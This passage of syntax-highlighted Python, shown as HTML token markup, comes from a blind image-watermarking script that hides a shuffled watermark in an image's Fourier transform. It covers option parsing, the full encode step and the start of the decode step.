alpha <span class="token operator">=</span> <span class="token number">3.0</span>

<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> <span class="token string">'-h'</span> <span class="token keyword">in</span> sys<span class="token punctuation">.</span>argv <span class="token keyword">or</span> <span class="token string">'--help'</span> <span class="token keyword">in</span> sys<span class="token punctuation">.</span>argv <span class="token keyword">or</span> <span class="token builtin">len</span><span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">2</span><span class="token punctuation">:</span>
        <span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token string">'Usage: python bwm.py &lt;cmd> [arg...] [opts...]'</span><span class="token punctuation">)</span>
        <span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token string">'  cmds:'</span><span class="token punctuation">)</span>
        <span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token string">'    encode &lt;image> &lt;watermark> &lt;image(encoded)>'</span><span class="token punctuation">)</span>
        <span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token string">'           image + watermark -> image(encoded)'</span><span class="token punctuation">)</span>
        <span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token string">'    decode &lt;image> &lt;image(encoded)> &lt;watermark>'</span><span class="token punctuation">)</span>
        <span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token string">'           image + image(encoded) -> watermark'</span><span class="token punctuation">)</span>
        <span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token string">'  opts:'</span><span class="token punctuation">)</span>
        <span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token string">'    --debug,          Show debug'</span><span class="token punctuation">)</span>
        <span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token string">'    --seed &lt;int>,     Manual setting random seed (default is 20160930)'</span><span class="token punctuation">)</span>
        <span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token string">'    --oldseed         Use python2 random algorithm.'</span><span class="token punctuation">)</span>
        <span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token string">'    --alpha &lt;float>,  Manual setting alpha (default is 3.0)'</span><span class="token punctuation">)</span>
        sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
    cmd <span class="token operator">=</span> sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>
    <span class="token keyword">if</span> cmd <span class="token operator">!=</span> <span class="token string">'encode'</span> <span class="token keyword">and</span> cmd <span class="token operator">!=</span> <span class="token string">'decode'</span><span class="token punctuation">:</span>
        <span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token string">'Wrong cmd %s'</span> <span class="token operator">%</span> cmd<span class="token punctuation">)</span>
        sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> <span class="token string">'--debug'</span> <span class="token keyword">in</span> sys<span class="token punctuation">.</span>argv<span class="token punctuation">:</span>
        debug <span class="token operator">=</span> <span class="token boolean">True</span>
        <span class="token keyword">del</span> sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">.</span>index<span class="token punctuation">(</span><span class="token string">'--debug'</span><span class="token punctuation">)</span><span class="token punctuation">]</span>
    <span class="token keyword">if</span> <span class="token string">'--seed'</span> <span class="token keyword">in</span> sys<span class="token punctuation">.</span>argv<span class="token punctuation">:</span>
        p <span class="token operator">=</span> sys<span class="token punctuation">.</span>argv<span class="token punctuation">.</span>index<span class="token punctuation">(</span><span class="token string">'--seed'</span><span class="token punctuation">)</span>
        <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">)</span> <span class="token operator">&lt;=</span> p<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">:</span>
            <span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token string">'Missing &lt;int> for --seed'</span><span class="token punctuation">)</span>
            sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
        seed <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span>p<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
        <span class="token keyword">del</span> sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span>p<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span>
        <span class="token keyword">del</span> sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span>p<span class="token punctuation">]</span>
    <span class="token keyword">if</span> <span class="token string">'--oldseed'</span> <span class="token keyword">in</span> sys<span class="token punctuation">.</span>argv<span class="token punctuation">:</span>
        oldseed <span class="token operator">=</span> <span class="token boolean">True</span>
        <span class="token keyword">del</span> sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">.</span>index<span class="token punctuation">(</span><span class="token string">'--oldseed'</span><span class="token punctuation">)</span><span class="token punctuation">]</span>
    <span class="token keyword">if</span> <span class="token string">'--alpha'</span> <span class="token keyword">in</span> sys<span class="token punctuation">.</span>argv<span class="token punctuation">:</span>
        p <span class="token operator">=</span> sys<span class="token punctuation">.</span>argv<span class="token punctuation">.</span>index<span class="token punctuation">(</span><span class="token string">'--alpha'</span><span class="token punctuation">)</span>
        <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">)</span> <span class="token operator">&lt;=</span> p<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">:</span>
            <span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token string">'Missing &lt;float> for --alpha'</span><span class="token punctuation">)</span>
            sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
        alpha <span class="token operator">=</span> <span class="token builtin">float</span><span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span>p<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
        <span class="token keyword">del</span> sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span>p<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span>
        <span class="token keyword">del</span> sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span>p<span class="token punctuation">]</span>
    <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">5</span><span class="token punctuation">:</span>
        <span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token string">'Missing arg...'</span><span class="token punctuation">)</span>
        sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
    fn1 <span class="token operator">=</span> sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span>
    fn2 <span class="token operator">=</span> sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span>
    fn3 <span class="token operator">=</span> sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span>

<span class="token keyword">import</span> cv2
<span class="token keyword">import</span> numpy <span class="token keyword">as</span> np
<span class="token keyword">import</span> matplotlib<span class="token punctuation">.</span>pyplot <span class="token keyword">as</span> plt

<span class="token comment"># OpenCV是以(BGR)的顺序存储图像数据的</span>
<span class="token comment"># 而Matplotlib是以(RGB)的顺序显示图像的</span>
<span class="token keyword">def</span> <span class="token function">bgr_to_rgb</span><span class="token punctuation">(</span>img<span class="token punctuation">)</span><span class="token punctuation">:</span>
    b<span class="token punctuation">,</span> g<span class="token punctuation">,</span> r <span class="token operator">=</span> cv2<span class="token punctuation">.</span>split<span class="token punctuation">(</span>img<span class="token punctuation">)</span>
    <span class="token keyword">return</span> cv2<span class="token punctuation">.</span>merge<span class="token punctuation">(</span><span class="token punctuation">[</span>r<span class="token punctuation">,</span> g<span class="token punctuation">,</span> b<span class="token punctuation">]</span><span class="token punctuation">)</span>

<span class="token keyword">if</span> cmd <span class="token operator">==</span> <span class="token string">'encode'</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token string">'image&lt;%s> + watermark&lt;%s> -> image(encoded)&lt;%s>'</span> <span class="token operator">%</span> <span class="token punctuation">(</span>fn1<span class="token punctuation">,</span> fn2<span class="token punctuation">,</span> fn3<span class="token punctuation">)</span><span class="token punctuation">)</span>
    img <span class="token operator">=</span> cv2<span class="token punctuation">.</span>imread<span class="token punctuation">(</span>fn1<span class="token punctuation">)</span>
    wm <span class="token operator">=</span> cv2<span class="token punctuation">.</span>imread<span class="token punctuation">(</span>fn2<span class="token punctuation">)</span>

    <span class="token keyword">if</span> debug<span class="token punctuation">:</span>
        plt<span class="token punctuation">.</span>subplot<span class="token punctuation">(</span><span class="token number">231</span><span class="token punctuation">)</span><span class="token punctuation">,</span> plt<span class="token punctuation">.</span>imshow<span class="token punctuation">(</span>bgr_to_rgb<span class="token punctuation">(</span>img<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> plt<span class="token punctuation">.</span>title<span class="token punctuation">(</span><span class="token string">'image'</span><span class="token punctuation">)</span>
        plt<span class="token punctuation">.</span>xticks<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span> plt<span class="token punctuation">.</span>yticks<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
        plt<span class="token punctuation">.</span>subplot<span class="token punctuation">(</span><span class="token number">234</span><span class="token punctuation">)</span><span class="token punctuation">,</span> plt<span class="token punctuation">.</span>imshow<span class="token punctuation">(</span>bgr_to_rgb<span class="token punctuation">(</span>wm<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> plt<span class="token punctuation">.</span>title<span class="token punctuation">(</span><span class="token string">'watermark'</span><span class="token punctuation">)</span>
        plt<span class="token punctuation">.</span>xticks<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span> plt<span class="token punctuation">.</span>yticks<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span>

    <span class="token comment"># print img.shape # 高, 宽, 通道</span>
    h<span class="token punctuation">,</span> w <span class="token operator">=</span> img<span class="token punctuation">.</span>shape<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> img<span class="token punctuation">.</span>shape<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>
    hwm <span class="token operator">=</span> np<span class="token punctuation">.</span>zeros<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>h <span class="token operator">*</span> <span class="token number">0.5</span><span class="token punctuation">)</span><span class="token punctuation">,</span> w<span class="token punctuation">,</span> img<span class="token punctuation">.</span>shape<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">assert</span> hwm<span class="token punctuation">.</span>shape<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">></span> wm<span class="token punctuation">.</span>shape<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
    <span class="token keyword">assert</span> hwm<span class="token punctuation">.</span>shape<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">></span> wm<span class="token punctuation">.</span>shape<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>
    hwm2 <span class="token operator">=</span> np<span class="token punctuation">.</span>copy<span class="token punctuation">(</span>hwm<span class="token punctuation">)</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>wm<span class="token punctuation">.</span>shape<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>wm<span class="token punctuation">.</span>shape<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            hwm2<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> wm<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span>

    <span class="token keyword">if</span> oldseed<span class="token punctuation">:</span> random<span class="token punctuation">.</span>seed<span class="token punctuation">(</span>seed<span class="token punctuation">,</span>version<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span> random<span class="token punctuation">.</span>seed<span class="token punctuation">(</span>seed<span class="token punctuation">)</span>
    m<span class="token punctuation">,</span> n <span class="token operator">=</span> <span class="token builtin">list</span><span class="token punctuation">(</span><span class="token builtin">range</span><span class="token punctuation">(</span>hwm<span class="token punctuation">.</span>shape<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token builtin">list</span><span class="token punctuation">(</span><span class="token builtin">range</span><span class="token punctuation">(</span>hwm<span class="token punctuation">.</span>shape<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> oldseed<span class="token punctuation">:</span>
        random<span class="token punctuation">.</span>shuffle<span class="token punctuation">(</span>m<span class="token punctuation">,</span>random<span class="token operator">=</span>random<span class="token punctuation">.</span>random<span class="token punctuation">)</span>
        random<span class="token punctuation">.</span>shuffle<span class="token punctuation">(</span>n<span class="token punctuation">,</span>random<span class="token operator">=</span>random<span class="token punctuation">.</span>random<span class="token punctuation">)</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        random<span class="token punctuation">.</span>shuffle<span class="token punctuation">(</span>m<span class="token punctuation">)</span>
        random<span class="token punctuation">.</span>shuffle<span class="token punctuation">(</span>n<span class="token punctuation">)</span>

    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>hwm<span class="token punctuation">.</span>shape<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>hwm<span class="token punctuation">.</span>shape<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            hwm<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> hwm2<span class="token punctuation">[</span>m<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">[</span>n<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">]</span>

    rwm <span class="token operator">=</span> np<span class="token punctuation">.</span>zeros<span class="token punctuation">(</span>img<span class="token punctuation">.</span>shape<span class="token punctuation">)</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>hwm<span class="token punctuation">.</span>shape<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>hwm<span class="token punctuation">.</span>shape<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            rwm<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> hwm<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span>
            rwm<span class="token punctuation">[</span>rwm<span class="token punctuation">.</span>shape<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">-</span> i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span>rwm<span class="token punctuation">.</span>shape<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">-</span> j <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> hwm<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span>

    <span class="token keyword">if</span> debug<span class="token punctuation">:</span>
        plt<span class="token punctuation">.</span>subplot<span class="token punctuation">(</span><span class="token number">235</span><span class="token punctuation">)</span><span class="token punctuation">,</span> plt<span class="token punctuation">.</span>imshow<span class="token punctuation">(</span>bgr_to_rgb<span class="token punctuation">(</span>rwm<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> \
            plt<span class="token punctuation">.</span>title<span class="token punctuation">(</span><span class="token string">'encrypted(watermark)'</span><span class="token punctuation">)</span>
        plt<span class="token punctuation">.</span>xticks<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span> plt<span class="token punctuation">.</span>yticks<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span>

    f1 <span class="token operator">=</span> np<span class="token punctuation">.</span>fft<span class="token punctuation">.</span>fft2<span class="token punctuation">(</span>img<span class="token punctuation">)</span>
    f2 <span class="token operator">=</span> f1 <span class="token operator">+</span> alpha <span class="token operator">*</span> rwm
    _img <span class="token operator">=</span> np<span class="token punctuation">.</span>fft<span class="token punctuation">.</span>ifft2<span class="token punctuation">(</span>f2<span class="token punctuation">)</span>

    <span class="token keyword">if</span> debug<span class="token punctuation">:</span>
        plt<span class="token punctuation">.</span>subplot<span class="token punctuation">(</span><span class="token number">232</span><span class="token punctuation">)</span><span class="token punctuation">,</span> plt<span class="token punctuation">.</span>imshow<span class="token punctuation">(</span>bgr_to_rgb<span class="token punctuation">(</span>np<span class="token punctuation">.</span>real<span class="token punctuation">(</span>f1<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> \
            plt<span class="token punctuation">.</span>title<span class="token punctuation">(</span><span class="token string">'fft(image)'</span><span class="token punctuation">)</span>
        plt<span class="token punctuation">.</span>xticks<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span> plt<span class="token punctuation">.</span>yticks<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span>

    img_wm <span class="token operator">=</span> np<span class="token punctuation">.</span>real<span class="token punctuation">(</span>_img<span class="token punctuation">)</span>

    <span class="token keyword">assert</span> cv2<span class="token punctuation">.</span>imwrite<span class="token punctuation">(</span>fn3<span class="token punctuation">,</span> img_wm<span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token builtin">int</span><span class="token punctuation">(</span>cv2<span class="token punctuation">.</span>IMWRITE_JPEG_QUALITY<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">]</span><span class="token punctuation">)</span>

    <span class="token comment"># 这里计算下保存前后的(溢出)误差</span>
    img_wm2 <span class="token operator">=</span> cv2<span class="token punctuation">.</span>imread<span class="token punctuation">(</span>fn3<span class="token punctuation">)</span>
    <span class="token builtin">sum</span> <span class="token operator">=</span> <span class="token number">0</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>img_wm<span class="token punctuation">.</span>shape<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>img_wm<span class="token punctuation">.</span>shape<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            <span class="token keyword">for</span> k <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>img_wm<span class="token punctuation">.</span>shape<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
                <span class="token builtin">sum</span> <span class="token operator">+=</span> np<span class="token punctuation">.</span>power<span class="token punctuation">(</span>img_wm<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">[</span>k<span class="token punctuation">]</span> <span class="token operator">-</span> img_wm2<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span>
    miss <span class="token operator">=</span> np<span class="token punctuation">.</span>sqrt<span class="token punctuation">(</span><span class="token builtin">sum</span><span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token punctuation">(</span>img_wm<span class="token punctuation">.</span>shape<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">*</span> img_wm<span class="token punctuation">.</span>shape<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">*</span> img_wm<span class="token punctuation">.</span>shape<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">100</span>
    <span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token string">'Miss %s%% in save'</span> <span class="token operator">%</span> miss<span class="token punctuation">)</span>

    <span class="token keyword">if</span> debug<span class="token punctuation">:</span>
        plt<span class="token punctuation">.</span>subplot<span class="token punctuation">(</span><span class="token number">233</span><span class="token punctuation">)</span><span class="token punctuation">,</span> plt<span class="token punctuation">.</span>imshow<span class="token punctuation">(</span>bgr_to_rgb<span class="token punctuation">(</span>np<span class="token punctuation">.</span>uint8<span class="token punctuation">(</span>img_wm<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> \
            plt<span class="token punctuation">.</span>title<span class="token punctuation">(</span><span class="token string">'image(encoded)'</span><span class="token punctuation">)</span>
        plt<span class="token punctuation">.</span>xticks<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span> plt<span class="token punctuation">.</span>yticks<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span>

    f2 <span class="token operator">=</span> np<span class="token punctuation">.</span>fft<span class="token punctuation">.</span>fft2<span class="token punctuation">(</span>img_wm<span class="token punctuation">)</span>
    rwm <span class="token operator">=</span> <span class="token punctuation">(</span>f2 <span class="token operator">-</span> f1<span class="token punctuation">)</span> <span class="token operator">/</span> alpha
    rwm <span class="token operator">=</span> np<span class="token punctuation">.</span>real<span class="token punctuation">(</span>rwm<span class="token punctuation">)</span>

    wm <span class="token operator">=</span> np<span class="token punctuation">.</span>zeros<span class="token punctuation">(</span>rwm<span class="token punctuation">.</span>shape<span class="token punctuation">)</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>rwm<span class="token punctuation">.</span>shape<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">*</span> <span class="token number">0.5</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>rwm<span class="token punctuation">.</span>shape<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            wm<span class="token punctuation">[</span>m<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">[</span>n<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">=</span> np<span class="token punctuation">.</span>uint8<span class="token punctuation">(</span>rwm<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>rwm<span class="token punctuation">.</span>shape<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">*</span> <span class="token number">0.5</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>rwm<span class="token punctuation">.</span>shape<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            wm<span class="token punctuation">[</span>rwm<span class="token punctuation">.</span>shape<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">-</span> i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span>rwm<span class="token punctuation">.</span>shape<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">-</span> j <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> wm<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span>

    <span class="token keyword">if</span> debug<span class="token punctuation">:</span>
        <span class="token keyword">assert</span> cv2<span class="token punctuation">.</span>imwrite<span class="token punctuation">(</span><span class="token string">'_bwm.debug.wm.jpg'</span><span class="token punctuation">,</span> wm<span class="token punctuation">)</span>
        plt<span class="token punctuation">.</span>subplot<span class="token punctuation">(</span><span class="token number">236</span><span class="token punctuation">)</span><span class="token punctuation">,</span> plt<span class="token punctuation">.</span>imshow<span class="token punctuation">(</span>bgr_to_rgb<span class="token punctuation">(</span>wm<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> plt<span class="token punctuation">.</span>title<span class="token punctuation">(</span><span class="token string">u'watermark'</span><span class="token punctuation">)</span>
        plt<span class="token punctuation">.</span>xticks<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span> plt<span class="token punctuation">.</span>yticks<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span>

    <span class="token keyword">if</span> debug<span class="token punctuation">:</span>
        plt<span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token keyword">elif</span> cmd <span class="token operator">==</span> <span class="token string">'decode'</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token string">'image&lt;%s> + image(encoded)&lt;%s> -> watermark&lt;%s>'</span> <span class="token operator">%</span> <span class="token punctuation">(</span>fn1<span class="token punctuation">,</span> fn2<span class="token punctuation">,</span> fn3<span class="token punctuation">)</span><span class="token punctuation">)</span>
    img <span class="token operator">=</span> cv2<span class="token punctuation">.</span>imread<span class="token punctuation">(</span>fn1<span class="token punctuation">)</span>
    img_wm <span class="token operator">=</span> cv2<span class="token punctuation">.</span>imread<span class="token punctuation">(</span>fn2<span class="token punctuation">)</span>

    <span class="token keyword">if</span> debug<span class="token punctuation">:</span>
        plt<span class="token punctuation">.</span>subplot<span class="token punctuation">(</span><span class="token number">231</span><span class="token punctuation">)</span><span class="token punctuation">,</span> plt<span class="token punctuation">.</span>imshow<span class="token punctuation">(</span>bgr_to_rgb<span class="token punctuation">(</span>img<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> plt<span class="token punctuation">.</span>title<span class="token punctuation">(</span><span class="token string">'image'</span><span class="token punctuation">)</span>
        plt<span class="token punctuation">.</span>xticks<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span> plt<span class="token punctuation">.</span>yticks<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
        plt<span class="token punctuation">.</span>subplot<span class="token punctuation">(</span><span class="token number">234</span><span class="token punctuation">)</span><span class="token punctuation">,</span> plt<span class="token punctuation">.</span>imshow<span class="token punctuation">(</span>bgr_to_rgb<span class="token punctuation">(</span>img_wm<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> plt<span class="token punctuation">.</span>title<span class="token punctuation">(</span><span class="token string">'image(encoded)'</span><span class="token punctuation">)</span>
